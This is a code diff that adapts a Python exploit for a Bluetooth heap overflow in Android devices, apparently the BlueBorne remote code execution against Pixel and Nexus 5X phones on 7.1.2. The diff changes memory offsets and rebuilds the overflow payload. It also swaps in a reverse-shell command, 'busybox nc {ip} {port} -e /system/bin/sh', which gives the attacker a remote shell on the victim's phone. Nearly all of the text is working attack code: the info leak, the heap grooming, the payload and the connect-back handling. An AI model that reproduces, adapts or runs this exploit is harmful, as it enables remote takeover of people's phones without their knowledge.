@@ -11,10 +11,10 @@ from bluetooth import _bluetooth as bt
 import bluedroid
 import connectback
 
-from pwn import log
+from pwn import *
 
 # Listening TCP ports that need to be opened on the attacker machine
-NC_PORT = 1233
+NC_PORT = 8888
 STDOUT_PORT = 1234
 STDIN_PORT = 1235
 
@@ -27,24 +27,24 @@ STDIN_PORT = 1235
 # 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so
 
 # For Pixel 7.1.2 patch level Aug/July 2017
-LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1 - 56 # system + 1
-LIBC_SOME_BLX_OFFSET = 0x1a420 + 1 - 608 # eventfd_write + 28 + 1
+LIBC_TEXT_STSTEM_OFFSET = 0x46b4c + 1 # system + 1
+LIBC_SOME_BLX_OFFSET = 0x2a6f77
 
 # For Nexus 5X 7.1.2 patch level Aug/July 2017
 #LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
 #LIBC_SOME_BLX_OFFSET = 0x1a420 + 1
 
 # Aligned to 4 inside the name on the bss (same for both supported phones)
-BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
-BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x14b244
+BSS_ACL_REMOTE_NAME_OFFSET = 0x23CE48
+BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xfd81d
 
 MAX_BT_NAME = 0xf5
 
 # Payload details (attacker IP should be accessible over the internet for the victim phone)
-SHELL_SCRIPT = b'toybox nc {ip} {port} | sh'
+SHELL_SCRIPT = b'busybox nc {ip} {port} -e /system/bin/sh'
 
 
-PWNING_TIMEOUT = 3
+PWNING_TIMEOUT = 31
 BNEP_PSM = 15
 PWN_ATTEMPTS = 10
 LEAK_ATTEMPTS = 5
@@ -95,8 +95,8 @@ def memory_leak_get_bases(src, src_hci, dst):
     result = bluedroid.do_sdp_info_leak(dst, src)
 
     # Calculate according to known libc.so and bluetooth.default.so binaries
-    likely_some_libc_blx_offset = result[-3][-2]
-    likely_some_bluetooth_default_global_var_offset = result[6][0]
+    likely_some_libc_blx_offset = result[2][5]
+    likely_some_bluetooth_default_global_var_offset = result[3][3]
 
     libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET
     bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET
@@ -118,7 +118,12 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
     # Payload is: '"\x17AAAAAAsysm";\n<bash_commands>\n#'
     # 'sysm' is the address of system() from libc. The *whole* payload is a shell script.
     # 0x1700 == (0x1722 & 0xff00) is the "event" of a "HORRIBLE_HACK" message.
-    payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr) + b'";\n' + \
+
+    # payload = struct.pack('<III', 0xAAAA1722, 0x42424242, system_addr) + b'";\n' + \
+    #                       SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
+    system_addr_addr = acl_name_addr + 12 - 28
+    shellcode_addr = acl_name_addr + 16
+    payload = p32(shellcode_addr) + p32(acl_name_addr) + p32(system_addr_addr) + p32(system_addr) + \
                           SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
 
     assert len(payload) < MAX_BT_NAME
@@ -128,7 +133,6 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
     set_bt_name(payload, src_hci, src, dst)
 
     prog = log.progress('Connecting to BNEP again')
-
     bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
     bnep.bind((src, 0))
     bnep.connect((dst, BNEP_PSM))
@@ -140,7 +144,7 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
     # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
     # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
     # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
-    for i in range(20):
+    for i in range(30):
         bnep.send(binascii.unhexlify('8109' + '800109' * 100))
 
     # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
@@ -166,6 +170,7 @@ def main(src_hci, dst, my_ip):
 
     sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)
 
+
     for i in range(PWN_ATTEMPTS):
         log.info('Pwn attempt %d:' % (i,))
 
@@ -177,6 +182,7 @@ def main(src_hci, dst, my_ip):
             libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, dst)
             if (libc_text_base & 0xfff == 0) and (bluetooth_default_bss_base & 0xfff == 0):
                 break
+            break#test
         else:
            assert False, "Memory doesn't seem to have leaked as expected. Wrong .so versions?"
 
